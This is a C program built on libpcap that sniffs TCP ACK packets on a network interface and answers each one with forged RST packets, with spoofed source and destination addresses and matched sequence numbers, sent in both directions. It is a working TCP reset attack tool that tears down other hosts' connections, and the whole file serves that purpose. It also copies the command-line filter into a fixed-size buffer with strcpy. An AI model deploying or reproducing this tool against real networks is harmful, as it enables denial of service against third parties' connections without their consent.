
#include <stdio.h>
#include <string.h>
//#include <stdlib.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
//#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>
#include <unistd.h>

#include <pcap.h>
#include "packet.h"



struct bpf_program fp;          
char cnet[INET_ADDRSTRLEN];     
bpf_u_int32 net;                
char cmask[INET_ADDRSTRLEN];    
bpf_u_int32 mask;               
pcap_t *handle;                 
int count = 1;


void pplus(char* dev, int linktype, char* filter);
void send_rst(struct in_addr src_ip, struct in_addr dest_ip, u_short src_port, u_short drc_port,
                     u_short id, unsigned int seq, u_char ttl, unsigned int ack);
void capture_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
void tcp_parser(const u_char *packet);
void sigint_handler(int signal);


int main(int argc, char **argv) {
   char *dev = NULL;
   char errbuf[PCAP_ERRBUF_SIZE];

   char filter_exp[] = "(tcp[13] == 0x10)"; //ACK
   struct in_addr net_addr, mask_addr;


   signal(SIGINT, sigint_handler);


   if (argc == 1) {
      fprintf(stderr, "Usage: %s [interface] [pcap_filter]\n", argv[0]);
      return 1;
   }

   if (argc >= 2) {
      dev = argv[1];
   }

   if (argc == 3) {
      strcpy(filter_exp, argv[2]);
   }

   if (argc > 3) {
      fprintf(stderr, "arguments too long.\n");
      return 1;
   }


   if (dev == NULL) {
      fprintf(stderr, "Couldn't find defalut device: %s\n", errbuf);
      return 1;
   }

   if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
      fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
      return 1;
   }
   else {
      net_addr.s_addr = net;
      strcpy(cnet, inet_ntoa(net_addr));
      mask_addr.s_addr = mask;
      strcpy(cmask, inet_ntoa(mask_addr));

      printf("ip: %s (%#x), cmask: %s (%#x)\n", cnet, htonl(net), cmask, htonl(mask));
   }

   handle = pcap_open_live(dev, SNAP_LEN, 1, 1000, errbuf);
   if (handle == NULL) {
      fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
      return 1;
   }

   /*if ((type = pcap_datalink(handle)) != DLT_EN10MB) {
      fprintf(stderr, "%s: Doesn't provide Ethernet headers - link type was %d\n", dev, type);
      return 1;
   }*/
   pplus(dev, pcap_datalink(handle), filter_exp);

   if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
      fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
      return 1;
   }

   if (pcap_setfilter(handle, &fp) == -1) {
      fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
      return 1;
   }

   pcap_loop(handle, -1, capture_handler, NULL);

   pcap_freecode(&fp);
   pcap_close(handle);
   printf("complete\n");

   return 0;
}

void pplus(char* dev, int linktype, char* filter) {
   printf("listening on %s, ", dev);
   printf("link-type %s (%s)\n", pcap_datalink_val_to_description(linktype), pcap_datalink_val_to_name(linktype));
   printf("pcap filter expression: %s\n\n", filter);
}

unsigned short chksum(unsigned short *addr,int len){
   register int sum = 0;
   u_short a = 0;
   register u_short *w = addr;
   register int nleft = len;

   while (nleft > 1) {
      sum += *w++;
      nleft -= 2;
   }

   if (nleft == 1) {
      *(u_char *)(&a) = *(u_char *) w;
      sum += a;
   }

   sum =  (sum >> 16) + (sum &0xffff); 
   sum += (sum >> 16); 
   a = ~sum; 
   return a;
}

void send_rst(struct in_addr src_ip, struct  in_addr dest_ip, u_short src_port, u_short dest_port,
                  u_short id, unsigned int seq, u_char ttl, unsigned int ack) {
   int sockfd;
   struct sockaddr_in dest_addr;
   char dat[4096];
   struct iphdr *iph = (struct iphdr *) dat;
   struct tcphdr *tcph = (struct tcphdr *)(dat + sizeof (struct iphdr));
   int one = 1;
   const int *v = &one;
   struct pseudohdr *phdr;
   char tmp[INET_ADDRSTRLEN];


   if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0) {
      perror("send_rst() sock failed:");
      exit(1);
   }
   if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, v, sizeof(one)) < 0){
      perror("setsockopt failed: ");
   }

   strncpy(tmp, inet_ntoa(dest_ip), INET_ADDRSTRLEN);
   dest_addr.sin_family = AF_INET;
   dest_addr.sin_port = dest_port;
   inet_pton(AF_INET, tmp, &dest_addr.sin_addr);

   memset (dat, 0, 4096);
   iph->ip_vhl    = 0x45;
   iph->ip_tos    = 0;
   iph->ip_len    = (IPTCPHDRSIZE);
   iph->ip_id     = id;
   iph->ip_off    = 0;
   iph->ip_ttl    = ttl;
   iph->ip_src    = src_ip;
   iph->ip_dst    = dest_ip;
   iph->ip_sum    = 0;
   iph->ip_p      = IPPROTO_TCP;
   iph->ip_sum    = chksum((unsigned short *)iph, IPHDRSIZE);

   tcph->th_sport = src_port;
   tcph->th_dport = dest_port;
   tcph->th_seq   = seq;
   tcph->th_ack   = 0;
   tcph->th_offx2 = 0x50;
   tcph->th_flags = TH_RST;
   tcph->th_win   = 0;
   tcph->th_urp   = 0;
   tcph->th_sum   = 0;

   phdr = (struct pseudohdr *) (dat + IPTCPHDRSIZE);
   phdr->src      = src_ip.s_addr;
   phdr->dst      = dest_ip.s_addr;
   phdr->zero     = 0;
   phdr->protocol = IPPROTO_TCP;
   phdr->tcp_len  = htons(TCPHDRSIZE);

   tcph->th_sum   = chksum((unsigned short *)tcph, IPTCPHDRSIZE);


   if (sendto(sockfd, dat, IPTCPHDRSIZE, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) < 0) {
      perror("sendto failed: ");
   }
   close(sockfd);
}

void capture_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
   const struct iphdr *ip;              
   int size_ip;
   char src[INET_ADDRSTRLEN];
   char dst[INET_ADDRSTRLEN];


   switch (pcap_datalink(handle)) {
      case DLT_NULL: // BSD loopback
         ip = (struct iphdr*)(packet + NULLHDRSIZE); // packet + 4
         break;
      case DLT_EN10MB: // Ethernet
         ip = (struct iphdr*)(packet + SIZE_ETHERNET); // packet + 14
         break;
      default: //Other
         ip = (struct iphdr*)(packet);
   }

   size_ip = IP_HL(ip)*4;
   if (size_ip < IPHDRSIZE) {
      printf("   * Invalid IP header length: %u bytes\n", size_ip);
      return;
   }

   strcpy(src, inet_ntoa(ip->ip_src));
   strcpy(dst, inet_ntoa(ip->ip_dst));
   printf("%d:\t", count++);
   printf("%s\t->\t", src);
   printf(" %s\t", dst);

   if (ip->ip_p == IPPROTO_TCP) {
      printf("TCP\t");
      tcp_parser((u_char *)ip);
   }
   printf("\n");
}

void tcp_parser(const u_char *packet) {
   const struct iphdr *ip;              
   const struct tcphdr *tcp;            

   int size_tcp;

   unsigned int src;
   unsigned int dst;

   ip = (struct iphdr*)(packet);
   tcp = (struct tcphdr*)(packet + IPHDRSIZE);

   size_tcp = TH_OFF(tcp)*4;
   if (size_tcp < TCPHDRSIZE) {
      printf("   * Invalid TCP header length: %u bytes\n", size_tcp);
      return;
   }

   src = ntohs(tcp->th_sport);
   dst = ntohs(tcp->th_dport);

   printf("%d\t->\t", src);
   printf(" %d\t", dst);

        
   send_rst(ip->ip_dst, ip->ip_src, tcp->th_dport, tcp->th_sport,
               ip->ip_id, tcp->th_ack, ip->ip_ttl, tcp->th_ack);
   send_rst(ip->ip_src, ip->ip_dst, tcp->th_sport, tcp->th_dport, 
               ip->ip_id, htonl(ntohl(tcp->th_seq)+1), ip->ip_ttl, tcp->th_ack);
}

void sigint_handler(int signal) {
  pcap_freecode(&fp);
  pcap_close(handle);
  exit(0);
}
